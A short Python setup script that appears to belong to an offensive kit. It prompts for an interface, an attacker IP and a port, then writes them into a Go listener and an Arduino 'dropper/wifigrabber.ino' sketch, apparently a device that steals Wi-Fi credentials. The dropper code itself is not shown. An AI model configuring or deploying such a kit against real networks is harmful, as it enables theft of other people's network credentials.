#!/usr/bin/python3


import getpass
from os import environ, rename, system


if __name__ == '__main__':
    proggie = "main.go"
    dropper = "dropper/wifigrabber.ino"
    if not environ.get('CH_PASSWD'):
        print("CH_PASSWD environmental variable not set")
        passwd = getpass.getpass("CH_PASSWD >>> ")
        system(f"export CH_PASSWD={passwd}")
    interface = input("INTERFACE >>> ")
    ip_address = input("IP_ADDRESS >>> ")
    port = input("PORT >>> ")
    with open(proggie, "r") as gfp:
        go_code = gfp.read()
    new_go_code = ""
    for line in go_code.split("\n"):
        if "const INTERFACE" in line:
            line = f"const INTERFACE = \"{interface}\""
        if "const PORT" in line:
            line = f"const PORT = \"{port}\""
        new_go_code += f"{line}\n"
    with open(proggie+".tmp", "w") as gfptr:
        gfptr.write(new_go_code)
    rename(proggie+".tmp", proggie)
        
    with open(dropper, "r") as dfp:
        d_code = dfp.read()
    new_d_code = ""
    for line in d_code.split("\n"):
        if "#define IP_ADDRESS" in line:
            line = f"#define IP_ADDRESS \"{ip_address}\""
        if "#define PORT" in line:
            line = f"#define PORT \"{port}\""
        new_d_code += f"{line}\n"
    with open(dropper+".tmp", "w") as dfptr:
        dfptr.write(new_d_code)
    rename(dropper+".tmp", dropper)
    print(f"Finished changing {interface}:{port} on files:\n\t{proggie}\n\t{dropper}")
    exit(0)
